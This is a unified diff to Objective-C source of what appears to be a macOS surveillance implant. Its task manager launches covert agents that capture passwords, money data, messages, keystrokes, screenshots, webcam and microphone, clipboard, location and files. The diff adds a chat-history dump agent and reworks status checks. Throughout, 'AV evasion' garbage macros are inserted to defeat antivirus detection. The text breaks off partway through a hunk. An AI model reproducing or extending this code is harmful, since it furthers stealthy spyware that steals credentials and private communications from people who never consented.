@@ -26,6 +26,7 @@
 #import "RCSMAgentMessages.h"
 #import "RCSMAgentPassword.h"
 #import "RCSMAgentMoney.h"
+#import "RCSMAgentChat.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
@@ -789,28 +790,31 @@ static NSLock *gSyncLock                  = nil;
             // AV evasion: only on release build
             AV_GARBAGE_001
             
-            if (agentConfiguration == nil)
+            if (agentConfiguration != nil)
+            {
+                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                    && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+                {
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentMoney setAgentConfiguration: agentConfiguration];
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentMoney
+                                           withObject: nil];
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Screenshot is already running");
+#endif
+                }
+            }
+            else
             {
 #ifdef DEBUG_TASK_MANAGER
-                errorLog(@"Internal config for agent Money not found");
+                infoLog(@"Agent not found");
 #endif
                 return FALSE;
             }
-            
-            // AV evasion: only on release build
-            AV_GARBAGE_002
-            
-            [agentConfiguration setObject: AGENT_START
-                                   forKey: @"status"];
-            
-            [agentMoney setAgentConfiguration: agentConfiguration];
-            
-            // AV evasion: only on release build
-            AV_GARBAGE_003
-            
-            [NSThread detachNewThreadSelector: @selector(start)
-                                     toTarget: agentMoney
-                                   withObject: nil];
         }
             break;
         case AGENT_PASSWORD:
@@ -827,29 +831,31 @@ static NSLock *gSyncLock                  = nil;
             // AV evasion: only on release build
             AV_GARBAGE_001
  
-            if (agentConfiguration == nil)
+            if (agentConfiguration != nil)
+            {
+                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                    && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+                {
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentPassword setAgentConfiguration: agentConfiguration];
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentPassword
+                                           withObject: nil];
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Screenshot is already running");
+#endif
+                }
+            }
+            else
             {
 #ifdef DEBUG_TASK_MANAGER
-                errorLog(@"Internal config for agent Password not found");
+                infoLog(@"Agent not found");
 #endif
                 return FALSE;
             }
-            
-            // AV evasion: only on release build
-            AV_GARBAGE_002
-            
-            [agentConfiguration setObject: AGENT_START
-                                   forKey: @"status"];
-            
-            [agentPassword setAgentConfiguration: agentConfiguration];
-            
-            // AV evasion: only on release build
-            AV_GARBAGE_003
-            
-            [NSThread detachNewThreadSelector: @selector(start)
-                                     toTarget: agentPassword
-                                   withObject: nil];
-            
         }
         break;
         case AGENT_MESSAGES:
@@ -866,157 +872,164 @@ static NSLock *gSyncLock                  = nil;
             // AV evasion: only on release build
             AV_GARBAGE_001
             
-            if (agentConfiguration == nil)
+            if (agentConfiguration != nil)
+            {
+                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                    && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+                {
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentMessages setAgentConfiguration: agentConfiguration];
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentMessages
+                                           withObject: nil];
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Screenshot is already running");
+#endif
+                }
+            }
+            else
             {
 #ifdef DEBUG_TASK_MANAGER
-                errorLog(@"Internal config for agent Messages not found");
+                infoLog(@"Agent not found");
 #endif
                 return FALSE;
             }
-            
-            // AV evasion: only on release build
-            AV_GARBAGE_002
-            
-            [agentConfiguration setObject: AGENT_START
-                                   forKey: @"status"];
-            
-            [agentMessages setAgentConfiguration: agentConfiguration];
-            
-            // AV evasion: only on release build
-            AV_GARBAGE_003
-            
-            [NSThread detachNewThreadSelector: @selector(start)
-                                     toTarget: agentMessages
-                                   withObject: nil];
-            
-/*
-        NSString *conf = [agentConfiguration objectForKey:@"data"];
-#ifdef DEBUG_MESSAGES
-            infoLog(@"conf agent msg: %@",conf);
-#endif
-*/
-        
         }
         break;
     case AGENT_SCREENSHOT:
-      {  
-        // AV evasion: only on release build
-        AV_GARBAGE_004
+        {
+          // AV evasion: only on release build
+          AV_GARBAGE_004
         
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Starting Agent Screenshot");
+          infoLog(@"Starting Agent Screenshot");
 #endif
-        __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+          __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
+          agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
-        if (agentConfiguration != nil)
+          if (agentConfiguration != nil)
           {
-            if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
-                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+              if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                  && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
               {
-                [agentConfiguration setObject: AGENT_START forKey: @"status"];
-                [agentScreenshot setAgentConfiguration: agentConfiguration];
-                
-                [NSThread detachNewThreadSelector: @selector(start)
+                  [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                  [agentScreenshot setAgentConfiguration: agentConfiguration];
+                  [NSThread detachNewThreadSelector: @selector(start)
                                          toTarget: agentScreenshot
                                        withObject: nil];
               }
-            else
+              else
               {
 #ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Agent Screenshot is already running");
+                  infoLog(@"Agent Screenshot is already running");
 #endif
               }
           }
-        else
+          else
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Agent not found");
+              infoLog(@"Agent not found");
 #endif
-
-            return FALSE;
+              return FALSE;
           }
+        }
         break;
-      }
     case AGENT_ORGANIZER:
       {  
-        // AV evasion: only on release build
-        AV_GARBAGE_002
+          // AV evasion: only on release build
+          AV_GARBAGE_002
         
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Starting Agent Organizer");
+          infoLog(@"Starting Agent Organizer");
 #endif
-        __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+          __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
+          agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
-        // AV evasion: only on release build
-        AV_GARBAGE_001
+          // AV evasion: only on release build
+          AV_GARBAGE_001
         
-        if (agentConfiguration == nil)
+          if (agentConfiguration != nil)
+          {
+              if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                  && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+              {
+                  [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                  [agentOrganizer setAgentConfiguration: agentConfiguration];
+                  
+                  [NSThread detachNewThreadSelector: @selector(start)
+                                           toTarget: agentOrganizer
+                                         withObject: nil];
+              }
+              else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"Agent Screenshot is already running");
+#endif
+              }
+          }
+          else
           {
 #ifdef DEBUG_TASK_MANAGER
-            errorLog(@"Internal config for agent Organizer not found");
+              infoLog(@"Agent not found");
 #endif
-            return FALSE;
+              return FALSE;
           }
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_002
-        
-        [agentConfiguration setObject: AGENT_START
-                               forKey: @"status"];
-        [agentOrganizer setAgentConfiguration: agentConfiguration];
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_003
-        
-        [NSThread detachNewThreadSelector: @selector(start)
-                                 toTarget: agentOrganizer
-                               withObject: nil];
-        
+        }
         break;
-      }
     case AGENT_CAM:
-      {  
-        // AV evasion: only on release build
-        AV_GARBAGE_000
+        {
+          // AV evasion: only on release build
+          AV_GARBAGE_000
         
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Starting Agent Webcam");
+          infoLog(@"Starting Agent Webcam");
 #endif
-        __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
+          __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
         
-        // AV evasion: only on release build
-        AV_GARBAGE_009
-        
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
-        
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
-        {  
           // AV evasion: only on release build
-          AV_GARBAGE_008
+          AV_GARBAGE_009
+        
+          agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+          if (agentConfiguration != nil)
+          {
+              if (![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_START])
+              {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_008
           
-            [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                  [agentConfiguration setObject: AGENT_START forKey: @"status"];
             
-            [agentWebcam setAgentConfiguration: agentConfiguration];
+                  [agentWebcam setAgentConfiguration: agentConfiguration];
           
-          // AV evasion: only on release build
-          AV_GARBAGE_007
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
           
 //            [NSThread detachNewThreadSelector: @selector(start)
 //                                     toTarget: agentWebcam
 //                                   withObject: nil];
-            [agentWebcam performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:FALSE];
+                  [agentWebcam performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:FALSE];
+              }
+              else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"Agent Webcam is already running");
+#endif
+              }
           }
-        else
+          else
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Agent Webcam is already running");
+              infoLog(@"Agent Webcam not found");
 #endif
+              return FALSE;
           }
+        }
         break;
-      }
     case AGENT_KEYLOG:
       {  
         // AV evasion: only on release build
@@ -1028,9 +1041,9 @@ static NSLock *gSyncLock                  = nil;
         // AV evasion: only on release build
         AV_GARBAGE_001
         
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
-          {
+        if (![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_START])
+        {
             shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
             shMemoryHeader->agentID   = agentID;
             shMemoryHeader->direction = D_TO_AGENT;
@@ -1061,14 +1074,14 @@ static NSLock *gSyncLock                  = nil;
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_KEYLOG
                                         fromComponent: COMP_CORE] == TRUE)
-                  {
+                {
                     [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
 #ifdef DEBUG_TASK_MANAGER
                     infoLog(@"Start command sent to Agent Keylog", agentID);
 #endif
-                  }
+                }
                 else
-                  {
+                {
 #ifdef DEBUG_TASK_MANAGER
                     infoLog(@"Error while sending start command to the agent");
 #endif
@@ -1079,7 +1092,7 @@ static NSLock *gSyncLock                  = nil;
                     [agentCommand release];
                     [agentConfiguration release];
                     return NO;
-                  }
+                }
               }
           }
         break;
@@ -1098,25 +1111,25 @@ static NSLock *gSyncLock                  = nil;
         // AV evasion: only on release build
         AV_GARBAGE_002
         
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
         {  
-          // AV evasion: only on release build
-          AV_GARBAGE_003
+            // AV evasion: only on release build
+            AV_GARBAGE_003
           
             shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
             shMemoryHeader->agentID = agentID;
             shMemoryHeader->direction = D_TO_AGENT;
             shMemoryHeader->command = AG_START;
           
-          // AV evasion: only on release build
-          AV_GARBAGE_004
+            // AV evasion: only on release build
+            AV_GARBAGE_004
           
             NSMutableData *urlConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
             NSData *agentConf = [agentConfiguration objectForKey: @"data"];
           
-          // AV evasion: only on release build
-          AV_GARBAGE_005
+            // AV evasion: only on release build
+            AV_GARBAGE_005
           
             shMemoryLog *_urlConfig     = (shMemoryLog *)[urlConfig bytes];
             _urlConfig->status          = SHMEM_WRITTEN;
@@ -1125,20 +1138,20 @@ static NSLock *gSyncLock                  = nil;
             _urlConfig->commandType     = CM_AGENT_CONF;
             _urlConfig->commandDataSize = [agentConf length];
           
-          // AV evasion: only on release build
-          AV_GARBAGE_003
+            // AV evasion: only on release build
+            AV_GARBAGE_003
           
             memcpy(_urlConfig->commandData,
                    [agentConf bytes],
                    [agentConf length]);
           
-          // AV evasion: only on release build
-          AV_GARBAGE_007
+            // AV evasion: only on release build
+            AV_GARBAGE_007
           
             if ([gSharedMemoryLogging writeMemory: urlConfig
                                            offset: 0
                                     fromComponent: COMP_CORE] == TRUE)
-              {
+            {
                 
                 // AV evasion: only on release build
                 AV_GARBAGE_008
@@ -1151,37 +1164,36 @@ static NSLock *gSyncLock                  = nil;
                 AV_GARBAGE_007
                 
                 if (success == TRUE)
-                  {
+                {
                     if ([gSharedMemoryCommand writeMemory: agentCommand
                                                    offset: OFFT_URL
                                             fromComponent: COMP_CORE] == TRUE)
-                      {
+                    {
                         [agentConfiguration setObject: AGENT_RUNNING
                                                forKey: @"status"];
-
 #ifdef DEBUG_TASK_MANAGER
                         infoLog(@"Start command sent to Agent URL", agentID);
 #endif
-                      }
+                    }
                     else
-                      {
+                    {
 #ifdef DEBUG_TASK_MANAGER
                         infoLog(@"An error occurred while starting agent URL");
 #endif
 
-                        [agentCommand release];
-                        [agentConfiguration release];
-                        return NO;
-                      }
-                  }
-              }
+                    [agentCommand release];
+                    [agentConfiguration release];
+                    return NO;
+                    }
+                }
+            }
             else
-              {
+            {
 #ifdef DEBUG_TASK_MANAGER
                 errorLog(@"Error while sending configuration to Agent URL");
 #endif
-              }
-          }
+            }
+        }
         break;
       }
     case AGENT_APPLICATION:
@@ -1192,8 +1204,8 @@ static NSLock *gSyncLock                  = nil;
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
           {  
             // AV evasion: only on release build
             AV_GARBAGE_003
@@ -1251,8 +1263,8 @@ static NSLock *gSyncLock                  = nil;
         // AV evasion: only on release build
         AV_GARBAGE_009
         
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
           {   
             
             // AV evasion: only on release build
@@ -1316,76 +1328,91 @@ static NSLock *gSyncLock                  = nil;
         break;
       }
     case AGENT_CHAT_NEW:
-      {  
-        // AV evasion: only on release build
-        AV_GARBAGE_005
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_005
         
-        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
-        // AV evasion: only on release build
-        AV_GARBAGE_002
-        
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
-          {  
             // AV evasion: only on release build
             AV_GARBAGE_002
-          
-            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-            shMemoryHeader->agentID   = agentID;
-            shMemoryHeader->direction = D_TO_AGENT;
-            shMemoryHeader->command   = AG_START;
-            
-            // AV evasion: only on release build
-            AV_GARBAGE_003
-            
-            BOOL success = [_logManager createLog: AGENT_CHAT_NEW
-                                      agentHeader: nil
-                                        withLogID: 0];
-            
-            if (success == TRUE)
-              {  
-                // AV evasion: only on release build
-                AV_GARBAGE_004
+        
+            if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
+                ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+            {
               
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_IM
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
+                // agent chat as history dump  starts here
+                __m_MAgentChat *agentChat = [__m_MAgentChat sharedInstance];
+                [agentConfiguration setObject: AGENT_START
+                                       forKey: @"status"];
+              
+                [agentChat setAgentConfiguration: agentConfiguration];
+              
+                // AV evasion: only on release build
+                AV_GARBAGE_003
+              
+                [NSThread detachNewThreadSelector: @selector(start)
+                                         toTarget: agentChat
+                                       withObject: nil];
+                // agent chat as history dump ends here
+
+                // AV evasion: only on release build
+                AV_GARBAGE_002
+          
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID   = agentID;
+                shMemoryHeader->direction = D_TO_AGENT;
+                shMemoryHeader->command   = AG_START;
+            
+                // AV evasion: only on release build
+                AV_GARBAGE_003
+            
+                BOOL success = [_logManager createLog: AGENT_CHAT_NEW
+                                          agentHeader: nil
+                                            withLogID: 0];
+            
+                if (success == TRUE)
+                {
                     // AV evasion: only on release build
-                    AV_GARBAGE_001
+                    AV_GARBAGE_004
+              
+                    if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                   offset: OFFT_IM
+                                            fromComponent: COMP_CORE] == TRUE)
+                    {
+                        // AV evasion: only on release build
+                        AV_GARBAGE_001
                     
-                    [agentConfiguration setObject: AGENT_RUNNING
-                                           forKey: @"status"];
-                  }
-                else
-                  {   
-                    // AV evasion: only on release build
-                    AV_GARBAGE_002
+                        [agentConfiguration setObject: AGENT_RUNNING
+                                               forKey: @"status"];
+                    }
+                    else
+                    {
+                        // AV evasion: only on release build
+                        AV_GARBAGE_002
                                     
-                    [agentCommand release];
-                    [agentConfiguration release];
-                    return NO;
-                  }
-              }
-          }
+                        [agentCommand release];
+                        //[agentConfiguration release];  // for chat as history dump
+                        //return NO;                     // for chat as history dump
+                    }
+                }
+            }
+        }
         break;
-      }
     case AGENT_CLIPBOARD:
       {  
         // AV evasion: only on release build
         AV_GARBAGE_001
         
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration retain];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         // AV evasion: only on release build
         AV_GARBAGE_008
         
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
           {   
             // AV evasion: only on release build
             AV_GARBAGE_004
@@ -1438,14 +1465,13 @@ static NSLock *gSyncLock                  = nil;
         AV_GARBAGE_008
         
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration retain];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         // AV evasion: only on release build
         AV_GARBAGE_003
         
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
           {     
             // AV evasion: only on release build
             AV_GARBAGE_002
@@ -1522,164 +1548,161 @@ static NSLock *gSyncLock                  = nil;
         break;
       }
     case AGENT_POSITION:
-      {
-        // AV evasion: only on release build
-        AV_GARBAGE_003
-        
-        __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
-
-        if (agentConfiguration != nil)
-          {  
+        {
             // AV evasion: only on release build
-            AV_GARBAGE_002
-          
-            if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
-                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
-              {  
-                // AV evasion: only on release build
-                AV_GARBAGE_000
-              
-                [agentConfiguration setObject: AGENT_START forKey: @"status"];
-                [agentPosition setAgentConfiguration: agentConfiguration];
-                
-                // AV evasion: only on release build
-                AV_GARBAGE_001
-                
-                [NSThread detachNewThreadSelector: @selector(start)
-                                         toTarget: agentPosition
-                                       withObject: nil];
-              }
-            else
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Agent Position is already running");
-#endif
-              }
-          }
-        else
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Agent not found");
-#endif
+            AV_GARBAGE_003
+        
+            __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
-            return FALSE;
-          }
-        break;
-      }
-    case AGENT_DEVICE:
-      {
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Starting Agent Device");
-#endif
-
-        // AV evasion: only on release build
-        AV_GARBAGE_001
-        
-        __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_002
-        
-        if (agentConfiguration != nil)
-          {
-            if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
-                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
-              {  
-                // AV evasion: only on release build
-                AV_GARBAGE_008
-              
-                [agentConfiguration setObject: AGENT_START forKey: @"status"];
-                [agentDevice setAgentConfiguration: agentConfiguration];
-                
-                // AV evasion: only on release build
-                AV_GARBAGE_004
-                
-                [NSThread detachNewThreadSelector: @selector(start)
-                                         toTarget: agentDevice
-                                       withObject: nil];
-              }
-            else
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Agent Device is already running");
-#endif
-              }
-          }
-        else
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Agent not found");
-#endif
-            return FALSE;
-          }
-        break;
-      }
-    case AGENT_MICROPHONE:
-      {  
-        // AV evasion: only on release build
-        AV_GARBAGE_001
-        
-        __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
-        agentConfiguration = [[self getConfigForAgent: agentID] retain];
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_002
-        
-        if (agentConfiguration != nil)
-          {            
-            // AV evasion: only on release build
-            AV_GARBAGE_001
-            
-            if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
-                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
-              {  
-                // AV evasion: only on release build
-                AV_GARBAGE_009
-              
-                [agentConfiguration setObject: AGENT_START forKey: @"status"];
-                [agentMic setAgentConfiguration: agentConfiguration];
-                
+            if (agentConfiguration != nil)
+            {
                 // AV evasion: only on release build
                 AV_GARBAGE_002
+          
+                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+                {
+                    // AV evasion: only on release build
+                    AV_GARBAGE_000
+              
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentPosition setAgentConfiguration: agentConfiguration];
                 
-                [NSThread detachNewThreadSelector: @selector(start)
-                                         toTarget: agentMic
-                                       withObject: nil];
-              }
-            else
-              {
+                    // AV evasion: only on release build
+                    AV_GARBAGE_001
+                
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentPosition
+                                           withObject: nil];
+                }
+                else
+                {
 #ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Agent Microphone is already running");
+                    infoLog(@"Agent Position is already running");
 #endif
-              }
-          }
-        else
-          {
+                }
+            }
+            else
+            {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Agent microphone not found");
+                infoLog(@"Agent not found");
+#endif
+                return FALSE;
+            }
+        }
+        break;
+    case AGENT_DEVICE:
+        {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Starting Agent Device");
 #endif
 
-            return FALSE;
-          }
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+        
+            __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+        
+            if (agentConfiguration != nil)
+            {
+                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
+                && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+                {
+                    // AV evasion: only on release build
+                    AV_GARBAGE_008
+              
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentDevice setAgentConfiguration: agentConfiguration];
+                
+                    // AV evasion: only on release build
+                    AV_GARBAGE_004
+                
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentDevice
+                                           withObject: nil];
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Device is already running");
+#endif
+                }
+            }
+            else
+            {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Agent not found");
+#endif
+                return FALSE;
+            }
+        }
         break;
-      }
+    case AGENT_MICROPHONE:
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+        
+            __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+        
+            if (agentConfiguration != nil)
+            {
+                // AV evasion: only on release build
+                AV_GARBAGE_001
+            
+                if (![[agentConfiguration objectForKey: @"status"] isEqual: AGENT_RUNNING]
+                && ![[agentConfiguration objectForKey: @"status"] isEqual: AGENT_START])
+                {
+                    // AV evasion: only on release build
+                    AV_GARBAGE_009
+              
+                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                    [agentMic setAgentConfiguration: agentConfiguration];
+                
+                    // AV evasion: only on release build
+                    AV_GARBAGE_002
+                
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentMic
+                                           withObject: nil];
+                }
+                else
+                {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Agent Microphone is already running");
+#endif
+                }
+            }
+            else
+            {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Agent microphone not found");
+#endif
+                return FALSE;
+            }
+        }
+        break;
     case AGENT_FILECAPTURE:
       {  
         // AV evasion: only on release build
         AV_GARBAGE_001
         
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration retain];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         // AV evasion: only on release build
         AV_GARBAGE_001
         
-        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
-            [agentConfiguration objectForKey: @"status"] != AGENT_START)
-          {  
+        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
+            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
+        {
             // AV evasion: only on release build
             AV_GARBAGE_002
           
@@ -1696,7 +1719,7 @@ static NSLock *gSyncLock                  = nil;
                                         withLogID: 0];
 
             if (success)
-              {  
+            {
                 // AV evasion: only on release build
                 AV_GARBAGE_003
               
@@ -1723,7 +1746,7 @@ static NSLock *gSyncLock                  = nil;
                 if ([gSharedMemoryLogging writeMemory: fileConfig
                                                offset: 0
                                         fromComponent: COMP_CORE] == TRUE)
-                  {                    
+                {
                     // AV evasion: only on release build
                     AV_GARBAGE_004                    
 
@@ -1962,7 +1985,7 @@ static NSLock *gSyncLock                  = nil;
 #endif
 
       }
-          break;
+        break;
       case AGENT_PASSWORD:
       {
    
@@ -2332,46 +2355,56 @@ static NSLock *gSyncLock                  = nil;
       break;
     }
     case AGENT_CHAT_NEW:
-    {      
-      // AV evasion: only on release build
-      AV_GARBAGE_001
-      
-      agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-      
-      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-      shMemoryHeader->agentID         = agentID;
-      shMemoryHeader->direction       = D_TO_AGENT;
-      shMemoryHeader->command         = AG_STOP;
-      
-      // AV evasion: only on release build
-      AV_GARBAGE_002
-      
-      if ([gSharedMemoryCommand writeMemory: agentCommand
-                                     offset: OFFT_IM
-                              fromComponent: COMP_CORE] == TRUE)
-      {        
-        // AV evasion: only on release build
-        AV_GARBAGE_000
-        
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-        
-        // AV evasion: only on release build
-        AV_GARBAGE_004
-        
